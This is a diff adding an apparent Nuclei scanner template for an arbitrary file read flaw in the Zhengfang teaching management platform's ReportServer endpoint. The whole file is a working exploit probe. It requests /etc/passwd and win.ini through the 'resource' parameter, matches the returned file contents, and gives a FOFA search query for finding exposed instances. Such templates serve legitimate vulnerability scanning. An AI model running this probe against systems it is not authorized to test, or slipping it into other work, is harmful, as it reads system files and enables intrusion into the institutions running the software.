@@ -1,0 +1,34 @@
+id: zfsoft-edu-ReportServer-fileread
+info:
+  name: 正方教学管理信息服务平台 ReportServer - fileread
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/9eefec0a4c311a412a86ab83bef3a25d3cb1766d/%E6%AD%A3%E6%96%B9/%E6%AD%A3%E6%96%B9%E6%95%99%E5%AD%A6%E7%AE%A1%E7%90%86%E4%BF%A1%E6%81%AF%E6%9C%8D%E5%8A%A1%E5%B9%B3%E5%8F%B0ReportServer%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: title="教学管理信息服务平台"
+  tags: fileread,zfsoft,edu
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true"
+      - "{{BaseURL}}/WebReport/ReportServer?op=resource&resource=c:/windows/win.ini&i18n=true"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
